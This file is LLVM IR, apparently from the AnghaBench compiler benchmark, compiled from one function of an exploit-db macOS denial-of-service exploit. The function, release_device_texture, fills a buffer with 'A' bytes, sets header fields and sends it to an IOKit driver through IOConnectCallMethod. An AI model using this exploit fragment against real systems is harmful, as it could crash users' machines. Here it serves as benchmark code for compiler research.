; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_39930.c_release_device_texture.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_39930.c_release_device_texture.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [25 x i8] c"IOConnectCall error: %x\0A\00", align 1
@.str.1 = private unnamed_addr constant [9 x i8] c"worked?\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @release_device_texture(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i64, align 8
  %4 = alloca [16 x i32], align 16
  %5 = alloca i32, align 4
  %6 = alloca [4096 x i8], align 16
  %7 = alloca i64, align 8
  %8 = alloca [16 x i32], align 16
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  store i32 0, i32* %5, align 4
  store i64 0, i64* %7, align 8
  store i32 0, i32* %9, align 4
  store i64 0, i64* %11, align 8
  store i64 4096, i64* %7, align 8
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %13 = load i64, i64* %7, align 8
  %14 = call i32 @memset(i8* %12, i8 signext 65, i64 %13)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %16 = getelementptr inbounds i8, i8* %15, i64 0
  %17 = bitcast i8* %16 to i32*
  store i32 1, i32* %17, align 4
  %18 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %19 = getelementptr inbounds i8, i8* %18, i64 4
  %20 = bitcast i8* %19 to i32*
  store i32 24, i32* %20, align 4
  %21 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %22 = getelementptr inbounds i8, i8* %21, i64 12
  %23 = bitcast i8* %22 to i32*
  store i32 510, i32* %23, align 4
  store i64 4096, i64* %11, align 8
  %24 = load i32, i32* %2, align 4
  %25 = getelementptr inbounds [16 x i32], [16 x i32]* %4, i64 0, i64 0
  %26 = load i32, i32* %5, align 4
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %28 = load i64, i64* %7, align 8
  %29 = getelementptr inbounds [16 x i32], [16 x i32]* %8, i64 0, i64 0
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %31 = call i64 @IOConnectCallMethod(i32 %24, i32 0, i32* %25, i32 %26, i8* %27, i64 %28, i32* %29, i32* %9, i8* %30, i64* %11)
  store i64 %31, i64* %3, align 8
  %32 = load i64, i64* %3, align 8
  %33 = load i64, i64* @KERN_SUCCESS, align 8
  %34 = icmp ne i64 %32, %33
  br i1 %34, label %35, label %38

35:                                               ; preds = %1
  %36 = load i64, i64* %3, align 8
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0), i64 %36)
  br label %40

38:                                               ; preds = %1
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  br label %40

40:                                               ; preds = %38, %35
  ret i32 0
}

declare dso_local i32 @memset(i8*, i8 signext, i64) #1

declare dso_local i64 @IOConnectCallMethod(i32, i32, i32*, i32, i8*, i64, i32*, i32*, i8*, i64*) #1

declare dso_local i32 @printf(i8*, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
